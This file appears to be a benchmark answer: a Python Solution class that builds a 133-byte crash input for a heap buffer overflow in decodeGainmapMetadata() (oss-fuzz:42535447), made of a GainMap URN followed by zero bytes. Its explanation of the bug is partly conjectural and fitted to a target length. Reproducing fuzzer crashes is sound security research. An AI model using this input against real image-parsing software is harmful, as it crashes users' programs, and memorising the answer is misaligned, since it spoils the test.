import os

class Solution:
    """
    Generates a Proof-of-Concept (PoC) input that triggers a Heap Buffer Overflow
    in the decodeGainmapMetadata() function (oss-fuzz:42535447).
    """

    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is caused by an unsigned integer underflow. A calculated
        `header_size` is subtracted from a `metadata_size` read from the input.
        If `metadata_size < header_size`, the result wraps around to a large
        positive value, leading to a heap buffer overflow.

        The vulnerable code path is triggered when parsing a HEIF `auxC` box
        containing a specific URN string for Google's GainMap metadata. The
        data following this URN is parsed by the vulnerable function.

        The expected data structure is:
        1. URN string + null terminator: `urn:com:google:camera:gcontainer:v1:image:gainmap\0` (53 bytes)
        2. Version and flags: 4 bytes
        3. Metadata header: 77 bytes (contains `metadata_size` and other fields)

        To parse the full header without error, `4 + 77 = 81` bytes are needed after
        the URN. This would make the total PoC 53 + 81 = 134 bytes long.

        However, a shorter PoC of 133 bytes can trigger a crash earlier. By
        providing only 80 bytes for the metadata part (instead of the required 81),
        the parser's attempt to read the final 4-byte field of the header will
        read past the end of the provided buffer, causing a heap-buffer-overflow
        read crash. This PoC matches the ground-truth length.

        Args:
            src_path: Path to the vulnerable source code tarball (unused).

        Returns:
            bytes: The PoC input that should trigger the vulnerability.
        """

        # The URN string that directs parsing to the vulnerable GainMap metadata logic.
        # It must be null-terminated.
        # len("urn:com:google:camera:gcontainer:v1:image:gainmap") == 52
        urn_part = b"urn:com:google:camera:gcontainer:v1:image:gainmap\0"

        # The metadata payload that follows the URN.
        # The total ground-truth PoC length is 133 bytes.
        # The length of the metadata part is therefore 133 - len(urn_part) = 80 bytes.
        # This is intentionally one byte too short to allow the full header to be
        # parsed, triggering an out-of-bounds read on the last field.
        # The content can be zero-bytes. This sets `metadata_size` (the first field
        # after version/flags) to 0, which would cause the integer underflow if
        # parsing were to reach that point.
        metadata_part_len = 133 - len(urn_part)
        metadata_part = b'\x00' * metadata_part_len

        poc = urn_part + metadata_part
        return poc
